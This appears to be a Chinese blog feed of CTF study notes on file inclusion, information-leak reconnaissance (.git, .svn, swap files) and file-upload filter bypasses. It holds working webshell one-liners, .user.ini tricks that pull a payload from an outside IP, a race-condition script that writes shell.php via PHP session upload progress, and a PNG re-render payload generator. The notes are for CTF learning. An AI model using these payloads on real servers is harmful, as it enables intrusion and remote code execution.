*&#39;);fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[mtfQ])?&gt;&#39;);?&gt;&quot;&#125;,               files=&#123;&quot;file&quot;:(&#39;q.txt&#39;, f)&#125;,            cookies=&#123;&#39;PHPSESSID&#39;:sessid&#125;        )def READ(session):    while True:        response = session.get(f&#39;http://250307c3-cf87-4811-987f-20189fa2442c.chall.ctf.show/?file=/tmp/sess_&#123;sessid&#125;&#39;)        if &#39;flag&#39; not in response.text:                print(&#39;[+++]retry&#39;)        else:            print(response.text)               sys.exit(0)with requests.session() as session:    t1 = threading.Thread(target=POST, args=(session, ))    t1.daemon = True    t1.start()    READ(session)</code></pre><p>表单尝试失败。。。。。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>任意文件包含漏洞</title>
      <link href="/2021/05/07/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
      <url>/2021/05/07/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p>#前言<br>先跳过sql，书本讲的很好，但是今天这个真的就不是特别开心，很奇怪为什么书本在讲解例题的时候不把环境放出来，这样就可以跟好的练习了。</p><span id="more"></span><h2>HCTF2016兵者多诡</h2><p>在github上下载了源码但是不会部署真的是难受。。。。。。</p><p>所以问题就是我拿不到题目的环境，所以只能看别人的WP照着做，反正我也感觉有题目这也肯定做不出来，思路就没有开阔</p><p>所以就做一次对别人WP的reaction</p><p>第一点：题目界面时上传图片，首先尝试上传一个图片，然后url变成url?fp=upload，所以大佬猜想应该为include（$fp+’.php’）典型的文件包含漏洞，从upload可以直接才想到include文件包含，并且题目提示还是在文件上传的时候，真的是厉害。接下来使用php：//filter/read=convert.base64-encode/resource=home.php读的源码。</p><p><img src="1.PNG"><br>web34</p><p>接下来学一点新的知识 </p><h3>Phar突破文件包含</h3>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>信息收集</title>
      <link href="/2021/05/06/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-1/"/>
      <url>/2021/05/06/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-1/</url>
      
        <content type="html"><![CDATA[<p>#前言</p><p>我要拾起从0到1ctfer成长之路了</p><span id="more"></span><h2>信息收集得重要性</h2>其实我在做过得有关于信息收集得题目主要就是，www.zip源码泄露，git源码泄露，以及robots.txt，以前去做信息收集相关题目的联系的时候有碰见过.swp相关的题目。所做的题目如果是关于信息泄露的，那么信息收集的工作必需在前期展开，否则拿不到源码题目就无法进行下去。<h1>敏感目录泄露</h1><h2>git泄露</h2>[漏洞介绍]：git是一个主流的分布式版本控制系统，开发人员在开发过程中经常忘记.git文件夹，导致攻击者可以通过.git文件夹中的信息获取开发人员提交过的所有的源码。<p>我做过的题目里边就是用扫描工具扫出来.git泄露，然后通过Githack来获取.git文件</p><p>相关题目：</p><h2>粗心的小李</h2><p><img src="1.PNG"></p><p>题目异常简单，就恢复之后，打开index.html就可以了</p><p><img src="2.PNG"></p><p>我自己跟一个傻叉似的，明明有一个index.html不打开非要想着去还原git之前版本。。。。。</p><h2>git 回滚</h2><p>git作为一个版本控制工具，会记录每一次提交commit的修改，所以当题目中存在git泄露时，flag（敏感）可能在修改中被删除或者或被覆盖了，这时我们可以需用运用命令来查看以前的版本</p><p><img src="3.PNG"></p><blockquote><p>git init 初始化一个仓库</p></blockquote><blockquote><p>git add flag.php添加一个空的文件,将文件放在了暂存区</p></blockquote><blockquote><p>echo “flag{hahaha}” &gt; flag.php 运用重定向将内容输入到flag.php里面</p></blockquote><blockquote><p>git commit -m “注释” 就是将暂存区的内容提交到当前分支中</p></blockquote><p>我们可以通过git reflog来获取提交记录</p><p><img src="4.PNG"></p><p>然后通过 git diff HEAD 版本号，来查看比较当前版本与想查看的commit发生的变化</p><p><img src="5.PNG"></p><p>也可以通过 git reset –hard HEAD^来进行查看</p><p><img src="6.PNG"></p><h2>git分支</h2><p><img src="7.PNG"></p><p>其实这张图里我们看到我们常用的分支就是master，但是如果我们执行git reflog 看到有<code> moving from secret to master</code>，这里面时藏有secret，但是我们使用工具githack时回复不出来的，所以这是需要手动下载wget url /.git/refs/heads/secret，这点暂时等到遇到类似的题目的时候在说吧</p><h2>svn泄露</h2>svn是源代码管理软件，造成svn泄露的原因是管理员的不规范操作将svn隐藏文件夹暴露于外网环境<h2>HG泄露</h2>在初始化项目时，HG会在当前文件夹下创建一个.hg隐藏文件夹，其中包含了代码和分支修改信息。<h2>小tips</h2><p>有时候明明是git泄露但是在url后面加上.git却是出错，这时如果我们在.git/后面加上config，有信息返回表明就是.git泄露，上述问题的出现应该时有关于重定向</p><h1>敏感备份文件</h1><h2>gedit备份文件</h2>产生的文件后面带上“~”如：index.php~<p><img src="11.PNG"></p><h2>vim备份文件</h2><p>我做的题目通常就时查看.index.php.swp（第一次意外退出）</p><p><img src="8.PNG"></p><p>建议文件用记事本打开，我用nodepay打开就全是nul，本来也就能找到flag，气死了</p><p><img src="9.PNG"></p><p><img src="10.PNG"></p><p>这是因为如果用户在编辑文件异常退出的时候，会在当前目录下生成一个备份文件，文件名为：.文件名.swp</p><p>*.swo第二次意外退出</p><p>*.swn第三次意外退出</p><h2>常规的一些文件</h2><p>robots.txt:记录一些目录和CMS版本信息</p><p>readme.md：记录cms版本信息，有的甚至有github地址</p><p><a href="http://www.zip/rar/tar.gz%EF%BC%9A%E5%BE%80%E5%BE%80%E6%98%AF%E7%BD%91%E7%AB%99%E7%9A%84%E6%BA%90%E7%A0%81%E5%A4%87%E4%BB%BD">www.zip/rar/tar.gz：往往是网站的源码备份</a></p><h1>banner识别</h1><p>这个就要看平时的积累了，</p><p>如果时thinkphp的web框架，我闷就可以尝试thinkphp相关漏洞</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfer-文件上传</title>
      <link href="/2021/05/06/ctfer-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2021/05/06/ctfer-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="前端校验"><a href="#前端校验" class="headerlink" title="前端校验"></a>前端校验</h1><p>后端无验证</p><p><img src="1.PNG" alt="image-20211206212510918"></p><hr><h1 id="后端效验"><a href="#后端效验" class="headerlink" title="后端效验"></a>后端效验</h1><p>后端效验有三个点</p><ul><li>文件名称：filename</li><li>文件类型：Content-Type</li><li>文件内容</li></ul><ul><li><p><img src="2.png" alt="image-20211206213149438"></p><h3 id="改文件名："><a href="#改文件名：" class="headerlink" title="改文件名："></a>改文件名：</h3><p>改大小写pHP（注意在linux下后缀名敏感,于是大写不能被解析）,php3,php5</p><p>使用%00进行截断</p><p><img src="3.png" alt="image-20211206215341266"></p></li></ul><h3 id="改文件类型"><a href="#改文件类型" class="headerlink" title="改文件类型"></a>改文件类型</h3><p>  Content-Type: image/png</p><p>  Content-Type: images/png<br>  Content-Type: images/jpeg</p><p>  用GIF89A进行绕过getimagesize的判断;</p><p>  #define width 1337<br>  #define height 1337</p><h3 id="文件魔术字节欺骗"><a href="#文件魔术字节欺骗" class="headerlink" title="文件魔术字节欺骗"></a>文件魔术字节欺骗</h3><p>  改二进制用89 50 4e 4c（png的）进行绕过</p><h3 id="使用-user-ini进行上传（配置文件可控）"><a href="#使用-user-ini进行上传（配置文件可控）" class="headerlink" title="使用.user.ini进行上传（配置文件可控）"></a>使用.user.ini进行上传（配置文件可控）</h3><p>  使用的条件是上传的目录里面需要存在.php文件</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#define width 20</span><br><span class="line">#define height 10</span><br><span class="line"></span><br><span class="line">auto_prepend_file&#x3D;shell.jpg</span><br></pre></td></tr></table></figure><p>  然后</p><p>  <img src="5.png" alt="image-20211206220406137"></p><p>  然后访问上传目录中存在的的.php文件，即可</p><h3 id="改文件内容"><a href="#改文件内容" class="headerlink" title="改文件内容"></a>改文件内容</h3><ul><li><p>php被过滤，使用<code>&lt;?=eval($_POST[1]);?&gt;</code></p></li><li><p>分号被过滤：在php脚本中最后一个分号可以省略</p></li><li><p>&lt;被过滤：上传.user.ini，auto_append_file=”<a href="http://139.224.40.131/&quot;,%E5%A6%82%E6%9E%9C%E6%B2%A1%E6%9C%89index.php%E7%9A%84%E8%AF%9D%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E5%85%88%E4%B8%8A%E4%BC%A0%E4%B8%80%E4%B8%AAindex.php">http://2346723459/&quot;,如果没有index.php的话我们可以先上传一个index.php</a></p></li><li><p>括号被过滤：</p><p><code>&lt;?=include &#39;/var/lo&#39;.&#39;g/nginx/access.l&#39;.&#39;og&#39;?&gt;</code></p><ul><li><p>如果空格也被过滤了：<code>&lt;?=include1(二进制改为0d)&#39;/var/lo&#39;.&#39;g/nginx/access.l&#39;.&#39;og&#39;?&gt;</code></p></li><li><p>如果点也被被过滤，&lt;?=include1(二进制改为0d)’<a href="http://139.224.40.131/&#39;?\&gt;">http://2346723459/&#39;?\&gt;</a></p><p>​    关闭apache，然后启动路由即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="comment"># 对用户进行加密</span></span><br><span class="line">app.secret_key = <span class="string">&#x27;*************************&#x27;</span></span><br><span class="line"><span class="comment"># 首页路由</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&lt;?php eval($_POST[1]);?&gt;&quot;</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>,debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>也可以直接上传.user.ini   auto_append_file=’<a href="http://139.224.40.131/&#39;">http://2346723459/&#39;</a></p></li><li><p>可以使用session进行文件包含</p><ol><li><p>首先上传.user.ini</p></li><li><p>然后上传shell</p></li><li><p>条件竞争</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#.user.ini</span></span><br><span class="line">GIF89A</span><br><span class="line">auto_append_file=<span class="string">&quot;shell&quot;</span></span><br><span class="line"><span class="comment">#shell</span></span><br><span class="line">GIF89A</span><br><span class="line"><span class="meta">&lt;?</span>include1(二进制改为<span class="number">0</span>d)<span class="string">&quot;/tmp/sess_lucky&quot;</span><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">#竞争脚本</span></span><br><span class="line">import io</span><br><span class="line">import sys</span><br><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">host = <span class="string">&#x27;http://69d76cb9-b8a9-498d-95c4-4a8da2d018ca.node4.buuoj.cn:81/flflflflag.php&#x27;</span></span><br><span class="line">sessid = <span class="string">&#x27;lucky&#x27;</span></span><br><span class="line"></span><br><span class="line">def POST(session):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        session.post(</span><br><span class="line">            host,</span><br><span class="line">            data=&#123;<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="string">&quot;&lt;?php system(&#x27;ls /&#x27;);fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval(<span class="subst">$_POST</span>[cmd])?&gt;&#x27;);echo md5(&#x27;1&#x27;);?&gt;&quot;</span>&#125;,</span><br><span class="line">            files=&#123;<span class="string">&quot;file&quot;</span>:(<span class="string">&#x27;a.txt&#x27;</span>, f)&#125;,</span><br><span class="line">            cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:sessid&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">def READ(session):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response = session.get(f<span class="string">&#x27;&#123;host&#125;?file=/tmp/sess_&#123;sessid&#125;&#x27;</span>)</span><br><span class="line">        <span class="comment"># print(response.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;c4ca4238a0b923820dcc509a6f75849b&#x27;</span> not in response.text:</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">&#x27;[+++]retry&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span>(response.text)</span><br><span class="line">            sys.<span class="keyword">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">with requests.session() <span class="keyword">as</span> session:</span><br><span class="line">    t1 = threading.Thread(target=POST, args=(session, ))</span><br><span class="line">    t1.daemon = <span class="literal">True</span></span><br><span class="line">    t1.start()</span><br><span class="line">    READ(session)</span><br></pre></td></tr></table></figure></li></ol></li></ul></li><li><p>方括号被过滤</p><ul><li>使用花括号过滤（这是不规范的写法，php8以上或更高版本有可能用不了）</li><li>使用array_pop : <code>&lt;?=eval(array_pop($_POST));?&gt;</code></li></ul><h3 id="就三个类型循环的进行检测，看是哪个地方被过滤了"><a href="#就三个类型循环的进行检测，看是哪个地方被过滤了" class="headerlink" title="就三个类型循环的进行检测，看是哪个地方被过滤了"></a>就三个类型循环的进行检测，看是哪个地方被过滤了</h3></li></ul><hr><h1 id="图片二次渲染"><a href="#图片二次渲染" class="headerlink" title="图片二次渲染"></a>图片二次渲染</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#部分源码</span></span><br><span class="line">ho json_encode(<span class="variable">$ret</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">2</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件类型不合规&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;    </span><br><span class="line">            &#125;</span><br><span class="line">                <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">3</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;只允许上传png格式图片&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                &#125;</span><br><span class="line">                    <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">0</span>,<span class="string">&quot;msg&quot;</span>=&gt;md5(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]).<span class="string">&quot;.png&quot;</span>);</span><br><span class="line">                    imagepng(<span class="variable">$png</span>,<span class="variable">$dst</span>);</span><br><span class="line">                    <span class="variable">$dst</span> = <span class="string">&#x27;upload/&#x27;</span>.md5(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">2</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件类型不合规&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$png</span>==<span class="literal">FALSE</span>)&#123;</span><br><span class="line">                <span class="variable">$png</span> = imagecreatefrompng(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">            <span class="keyword">if</span>(in_array(<span class="variable">$ext_suffix</span>, <span class="keyword">array</span>(<span class="string">&quot;png&quot;</span>)))&#123;</span><br><span class="line">            <span class="variable">$ext_suffix</span> = <span class="variable">$arr</span>[<span class="string">&#x27;extension&#x27;</span>];</span><br><span class="line">            <span class="variable">$arr</span> = pathinfo(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>)&#123;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">1</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件超过1024KB&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$filesize</span>&gt;<span class="number">1024</span>)&#123;</span><br><span class="line">    <span class="variable">$filesize</span> = (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] / <span class="number">1024</span>);</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">2</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>]);</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>)</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">*/</span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2020-10-27 17:14:10</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2020-10-24 19:34:52</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">&lt;?php</span></span><br><span class="line"><span class="comment">&lt;?phpX����s^7�����~_�&#125;�&#x27;���ɿ_�|�00cٹg��=�2��Q0</span></span><br><span class="line"><span class="comment">F�(�`��Q0</span></span><br><span class="line"><span class="comment">�</span></span><br><span class="line"><span class="comment">else if(($fileext == &quot;gif&quot;) &amp;&amp; ($filetype==&quot;image/gif&quot;))&#123;</span></span><br><span class="line"><span class="comment">            $im = imagecreatefromgif($target_path);</span></span><br><span class="line"><span class="comment">            if($im == false)&#123;</span></span><br><span class="line"><span class="comment">                $msg = &quot;该文件不是gif格式的图片！&quot;;</span></span><br><span class="line"><span class="comment">                <span class="doctag">@unlink</span>($target_path);</span></span><br><span class="line"><span class="comment">            &#125;else&#123;</span></span><br><span class="line"><span class="comment">                //给新图片指定文件名</span></span><br><span class="line"><span class="comment">                srand(time());</span></span><br><span class="line"><span class="comment">                $newfilename = strval(rand()).&quot;.gif&quot;;</span></span><br><span class="line"><span class="comment">                //显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line"><span class="comment">                $img_path = UPLOAD_PATH.&#x27;/&#x27;.$newfilename;</span></span><br><span class="line"><span class="comment">                imagegif($im,$img_path);</span></span><br><span class="line"><span class="comment">                <span class="doctag">@unlink</span>($target_path);</span></span><br><span class="line"><span class="comment">                $is_upload = true;</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">    &#125;else&#123;</span></span><br><span class="line"><span class="comment">        $msg = &quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br></pre></td></tr></table></figure><h4 id="png渲染脚本"><a href="#png渲染脚本" class="headerlink" title="png渲染脚本"></a>png渲染脚本</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = imagecreatetruecolor(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; sizeof(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = imagecolorallocate(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   imagesetpixel(<span class="variable">$img</span>, round(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line">imagepng(<span class="variable">$img</span>,<span class="string">&#x27;1.png&#x27;</span>);  <span class="comment">//要修改的图片的路径</span></span><br><span class="line"><span class="comment">/* 木马内容</span></span><br><span class="line"><span class="comment">&lt;?$_GET[0]($_POST[1]);?&gt;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="7.png" alt="image-20211207121139351"></p><h4 id="jpg"><a href="#jpg" class="headerlink" title="jpg"></a>jpg</h4><p>构成漏洞的代码：</p><blockquote><p>$jpg = imagecreatefromjpeg($_FILES[“file”][“tmp_name”]);</p></blockquote><p>如果我们正常上传一张图片，发包后出现ATOR: gd-jpeg v1.0 (using IJG JPEG v80), default quality，说明存在jpg二次渲染</p><p>这张是比较好用的jpg二次渲染的图片</p><p><img src="8.jpg" alt="jpg二次渲染专用"></p><p>使用方法，先上传这张图片</p><p>成功上传后，下载图片另存为2.jpg</p><p>为什么用2.jpg进行渲染，因为2.jpg是已经经过渲染过的，如果我们再次上传，改动的小一点，成功性高一点</p><p>渲染脚本 php index.php 2.jpg</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span 